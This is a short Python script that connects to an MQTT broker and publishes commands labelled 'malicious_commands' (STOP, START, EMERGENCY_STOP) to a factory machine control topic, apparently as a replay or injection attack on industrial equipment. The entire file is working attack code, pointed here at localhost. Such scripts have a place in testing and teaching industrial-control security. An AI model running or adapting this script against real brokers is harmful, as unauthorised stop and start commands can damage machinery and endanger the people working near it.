import paho.mqtt.client as mqtt
import time

broker = "localhost"
topic = "factory/machine1/control"
malicious_commands = ["STOP", "START", "EMERGENCY_STOP"]

client = mqtt.Client()
client.connect(broker, 1883, 60)

for cmd in malicious_commands:
    print(f"Replaying command: {cmd}")
    client.publish(topic, cmd)
    time.sleep(1)

client.disconnect()
